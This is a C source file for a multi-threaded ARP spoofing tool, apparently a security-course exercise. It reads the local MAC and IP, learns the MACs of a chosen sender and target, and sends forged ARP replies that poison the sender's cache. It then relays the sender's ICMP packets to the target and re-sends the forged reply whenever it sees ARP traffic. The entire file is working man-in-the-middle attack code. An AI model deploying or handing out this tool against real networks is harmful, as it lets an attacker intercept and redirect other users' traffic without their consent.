#include <stdio.h>
#include <unistd.h>
#include <libnet.h>
#include <netinet/in.h>
#include <libnet/libnet-types.h>
#include <libnet/libnet-macros.h>
#include <libnet/libnet-headers.h>
#include <pthread.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <stdint.h>

#define SIZE_ETHERNET 14

#pragma pack(push,1)
typedef struct ethhdr
{
	uint8_t ether_dhost[6];
	uint8_t ether_shost[6];
	uint16_t ether_type;
}ethhdr;

typedef struct arphdr
{
	uint16_t ar_hrd;
	uint16_t ar_pro;
	uint8_t ar_hln;
	uint8_t ar_pln;
	uint16_t ar_op;
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
}arphdr;

typedef struct argu
{
	int num;
	char* dev;
	char* Send_ip;
	char* Targ_ip;
}argu;
#pragma pack(pop)

void usage()
{
	printf("syntax: arp_spoof <interface> <sender IP> <target IP>\n");
	printf("sample: arp_spoof wlan0 192.168.10.2 192.168.10.1\n");
}

void make_arp_pkt(arphdr* arp_pkt, uint8_t* s_mac, uint8_t* t_mac, int op)
{
	int i;
	arp_pkt->ar_hrd = htons(0x1);
	arp_pkt->ar_pro = htons(0x0800);
	arp_pkt->ar_hln = 6;
	arp_pkt->ar_pln = 4;
	arp_pkt->ar_op = htons(op);

	memcpy(arp_pkt->sender_mac, s_mac, 6 * sizeof(uint8_t));

	if (t_mac != NULL)
		memcpy(arp_pkt->target_mac, t_mac, 6 * sizeof(uint8_t));
	else
		memset(arp_pkt->target_mac, 0, 6 * sizeof(uint8_t));
}

void make_ether_pkt(ethhdr* eth_pkt, uint8_t* dhost, uint8_t* shost, arphdr arp_hdr)
{
	memcpy(eth_pkt->ether_dhost, dhost, 6 * sizeof(uint8_t));
	memcpy(eth_pkt->ether_shost, shost, 6 * sizeof(uint8_t));
	eth_pkt->ether_type = htons(0x0806);

	memcpy(eth_pkt + 1, &arp_hdr, sizeof(struct arphdr));
}


void* thread_spoof(void* data)
{
	int s, i;
	struct ifreq ifrq;
	struct arphdr s_arphdr, fake_arphdr, fake_arphdr2;
	uint8_t* mymac = (uint8_t*)malloc(6 * sizeof(uint8_t));
	uint8_t* t_mac = (uint8_t*)malloc(6 * sizeof(uint8_t));
	uint8_t* s_mac = (uint8_t*)malloc(6 * sizeof(uint8_t));

	struct argu* arg = (struct argu*)data;

	s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (s < 0)
	{
		printf("socket error\n");
		return (void*)-1;
	}

	strcpy(ifrq.ifr_name, arg->dev);
	if (ioctl(s, SIOCGIFHWADDR, &ifrq) < 0)      //MAC 주소를 가져와서 ifrq에 저장
	{
		printf("MAC error\n");
		return (void*)-1;
	}

	//my MAC address
	printf("My MAC address: ");
	for (i = 0; i < 6; i++)
	{
		if (i < 5)
			printf("%02x:", (unsigned char)ifrq.ifr_addr.sa_data[i]);
		else
			printf("%02x\n", (unsigned char)ifrq.ifr_addr.sa_data[i]);
	}
	memcpy(mymac, ifrq.ifr_addr.sa_data, 6 * sizeof(uint8_t));

	if (ioctl(s, SIOCGIFADDR, &ifrq) < 0)          //IP 주소를 가져와서 ifrq에 저장
	{
		printf("IP error\n");
		return (void*)-1;
	}

	//my IP address
	printf("My IP address: ");
	struct sockaddr_in *sin;
	char ipbuf[32];
	sin = (struct sockaddr_in*)&ifrq.ifr_addr;
	printf("%s\n", inet_ntop(AF_INET, &sin->sin_addr, ipbuf, sizeof(ipbuf)));


	//make arp packet(attacker to sender)
	memset(s_mac, NULL, 6 * sizeof(uint8_t));
	make_arp_pkt(&s_arphdr, mymac, s_mac, 1);
	inet_pton(AF_INET, ipbuf, &s_arphdr.sender_ip);
	inet_pton(AF_INET, arg->Send_ip, &s_arphdr.target_ip);

	//make ethernet packet(attacker to sender)
	struct ethhdr s_ethpkt;
	int size;
	memset(s_mac, 255, 6 * sizeof(uint8_t));
	make_ether_pkt(&s_ethpkt, s_mac, mymac, s_arphdr);
	size = sizeof(struct ethhdr) + sizeof(struct arphdr);
	uint8_t* s_packet = (uint8_t*)malloc(size * sizeof(uint8_t));
	memcpy(s_packet, &s_ethpkt, size * sizeof(uint8_t));

	//send packet   
	char* dev = arg->dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL)
	{
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return (void*)-1;
	}

	if (pcap_sendpacket(handle, s_packet, size))
	{
		printf("Failed send packet\n");
		return (void*)-1;
	}


	//receive and parse packet -> get sender's mac
	while (1)
	{
		int j;
		const uint8_t* r_packet;
		struct pcap_pkthdr* header;
		struct ethhdr* r_ethhdr;
		int res = pcap_next_ex(handle, &header, &r_packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;
		
		r_ethhdr = (struct ethhdr*)(r_packet);
		if (r_ethhdr != NULL && ntohs(r_ethhdr->ether_type) == 0x0806 && !memcmp(r_ethhdr->ether_dhost, mymac, 6*sizeof(uint8_t)))
		{
			memcpy(s_mac, r_ethhdr->ether_shost, 6 * sizeof(uint8_t));   //sender mac 저장
			printf("get sender MAC : ");
			for (i = 0; i < 6; i++)
			{
				if (i < 5)
					printf("%02x:", (unsigned char)s_mac[i]);
				else
					printf("%02x\n", (unsigned char)s_mac[i]);
			}
			break;
		}
		else
			continue;
	}


	//make fake arp packet
	make_arp_pkt(&fake_arphdr, mymac, s_mac, 2);      //fake arp reply
	inet_pton(AF_INET, arg->Targ_ip, &fake_arphdr.sender_ip);
	inet_pton(AF_INET, arg->Send_ip, &fake_arphdr.target_ip);							   
	//make fake ethernet packet
	struct ethhdr fake_ethpkt;
	make_ether_pkt(&fake_ethpkt, s_mac, mymac, fake_arphdr);
	uint8_t* fake_packet = (uint8_t*)malloc(size * sizeof(uint8_t));
	memcpy(fake_packet, &fake_ethpkt, size * sizeof(uint8_t));

	if (pcap_sendpacket(handle, fake_packet, size))
	{
		printf("Failed send fake arp packet\n");
		return (void*)-1;
	}
	printf("spoofed sender!\n");


	//make arp packet2(attacker to target)
	memset(t_mac, NULL, 6 * sizeof(uint8_t));
	make_arp_pkt(&s_arphdr, mymac, t_mac, 1);
	inet_pton(AF_INET, ipbuf, &s_arphdr.sender_ip);
	inet_pton(AF_INET, (const char*)arg->Targ_ip, &s_arphdr.target_ip);

	//make ethernet packet2(attacker to target)
	memset(t_mac, 255, 6 * sizeof(uint8_t));
	make_ether_pkt(&s_ethpkt, t_mac, mymac, s_arphdr);
	size = sizeof(struct ethhdr) + sizeof(struct arphdr);
	memcpy(s_packet, &s_ethpkt, size * sizeof(uint8_t));

	//send packet2(attacker to target)
	if (pcap_sendpacket(handle, s_packet, size))
	{
		printf("Failed send packet\n");
		return (void*)-1;
	}

	//receive and parse packet -> get target's mac
	while (1)
	{
		int j;
		const uint8_t* r_packet;
		struct pcap_pkthdr* header;
		struct ethhdr* r_ethhdr;
		int res = pcap_next_ex(handle, &header, &r_packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;

		r_ethhdr = (struct ethhdr*)(r_packet);
		if (r_ethhdr != NULL && ntohs(r_ethhdr->ether_type) == 0x0806 && !memcmp(r_ethhdr->ether_dhost, mymac, 6*sizeof(uint8_t)) && memcmp(r_ethhdr->ether_shost, s_mac, 6*sizeof(uint8_t)))
		{
			memcpy(t_mac, r_ethhdr->ether_shost, 6 * sizeof(uint8_t));        //target mac 저장
			printf("get target MAC : ");
			for (i = 0; i < 6; i++)
			{
				if (i < 5)
					printf("%02x:", (unsigned char)t_mac[i]);
				else
					printf("%02x\n", (unsigned char)t_mac[i]);
			}
			break;
		}
		else
			continue;
	}

	//waiting for packet(ex: ping)....
	sleep(1);

	while (1)
	{
		int j;
		const uint8_t* r_packet;
		struct pcap_pkthdr* header;
		struct ethhdr* r_ethhdr;
		int res = pcap_next_ex(handle, &header, &r_packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;

		r_ethhdr = (struct ethhdr*)(r_packet);

		if (memcmp(r_ethhdr->ether_shost, s_mac, 6 * sizeof(uint8_t)))
			continue;

		//if icmp packet
		if (r_ethhdr != NULL && ntohs(r_ethhdr->ether_type) == 0x0800)      //icmp is in ip packet
		{
			struct libnet_ipv4_hdr* r_ip_hdr;
			r_ip_hdr = (struct libnet_ipv4_hdr*)(r_packet + 14);
			if (r_ip_hdr != NULL && r_ip_hdr->ip_p == 0x01)
			{
				if(!memcmp(r_ethhdr->ether_shost,s_mac,sizeof(s_mac)))
				{
					printf("get icmp packet from sender!\n");
					//change mac
					memcpy(r_ethhdr->ether_shost, mymac, 6 * sizeof(uint8_t));
					memcpy(r_ethhdr->ether_dhost, t_mac, 6 * sizeof(uint8_t));
					if (pcap_sendpacket(handle, (const uint8_t*)r_packet, 74))
					{
						printf("Failed send icmp packet\n");
						return (void*)-1;
					}
					printf("ICMP packet sending to target is completed!\n");
				}
			}
			else
				continue;
		}

		//if arp packet
		else if (r_ethhdr != NULL && ntohs(r_ethhdr->ether_type) == 0x0806)
		{
			//arp request(broadcast) from sender
			if (!memcmp(r_ethhdr->ether_shost, s_mac, 6 * sizeof(uint8_t)) && r_packet[21] == 2)
			{
				printf("get arp packet from sender\n");
				//send fake arp reply to sender
				if (pcap_sendpacket(handle, fake_packet, size))
				{
					printf("Failed send fake arp packet\n");
					return (void*)-1;
				}
			}
		}
		else
			continue;
	}
}


int main(int argc, char*argv[])
{
	int i, status;
	struct argu arg[10];
	pthread_t thread[10];
	
	if (argc < 4 || argc%2 == 1)
        {
                usage();
                return -1;
        }
	printf("argc: %d\n",argc);
	
	for(i=0;i<(argc-2)/2;i++)
	{
		arg[i].num = i;
		arg[i].dev = argv[1];
		arg[i].Send_ip = argv[i*2+2];
		arg[i].Targ_ip = argv[i*2+3];
	
		if(pthread_create(&thread[i], NULL, &thread_spoof, (void*)&arg[i]))
		{
			printf("Fail to create thread\n");
			return -1;
		}
	}
	
	for(i=0;i<(argc-2)/2;i++)
	{
		pthread_join(thread[i], (void**)&status);
	}
	
	return 0;
}
